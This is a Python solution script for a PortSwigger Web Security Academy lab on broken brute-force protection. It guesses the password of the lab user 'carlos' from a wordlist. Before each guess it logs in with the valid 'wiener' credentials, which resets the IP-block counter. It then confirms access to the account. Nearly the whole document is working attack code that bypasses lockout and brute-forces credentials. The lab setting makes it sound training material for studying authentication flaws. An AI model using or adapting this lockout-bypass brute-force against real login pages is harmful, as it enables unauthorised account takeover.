# Broken brute-force protection, IP block

# https://portswigger.net/web-security/authentication/password-based/lab-broken-bruteforce-protection-ip-block

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
import argparse


warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


##########################################################
#	FUNCTIONS
##########################################################

def brute_force_password(s, url):
	login_path = url + '/login'
	print(f"\n[+] Trying to brute force the login page to find Carlos's password...")
	users = []
	with open('./passwords.txt') as fp:
		for i, line in enumerate(fp):
			password = line.strip()

			user = 'wiener'			# Giving our valid credentials to avoid limit rate and IP block
			login_data = {'username': user, 'password': 'peter'}
			r = s.post(login_path, data=login_data, allow_redirects=False)

			user = 'carlos'			# Then try to brute force carlos password, etc...
			login_data = {'username': user, 'password': password}
			r = s.post(login_path, data=login_data, allow_redirects=False)

			if r.status_code == 302:
				print("[+] Found Carlos's Password:\t%s" % password)
				return r
	print('[-] Failed to find a valid Password')
	sys.exit(1)


##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: Broken brute-force protection, IP block')
	parser = argparse.ArgumentParser(description="[+] Lab: Broken brute-force protection, IP block")
	parser.add_argument('-U',dest='url',required=True, help="Target URL")
	args = parser.parse_args()
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(args.url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			print('[+] Trying to find valid credentials brute-forcing the login page...\n')
			time.sleep(1)
			parsed_url = urllib.parse.urlparse(args.url)
			host = parsed_url.netloc
			if parsed_url.port:
				port = parsed_url.port
			elif parsed_url.scheme == "https":
				port = 443
			elif parsed_url.scheme == "http":
				port = 80
			print(parsed_url)
			url = parsed_url.scheme + '://' + host
			time.sleep(2)
			r = brute_force_password(s, url)
			time.sleep(1)
			r = s.get(url + '/my-account')
			if 'Your username is: carlos' in r.text:
				print('\n[+] Successfully logged in as Carlos !')
			s.cookies.clear()
			time.sleep(2)
			r = s.get(url)
			if 'Congratulations, you solved the lab!' in r.text:
				print('\n[+] The lab is solved !')
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')
	except KeyboardInterrupt:
		sys.exit(0)

if __name__ == "__main__":
	main()
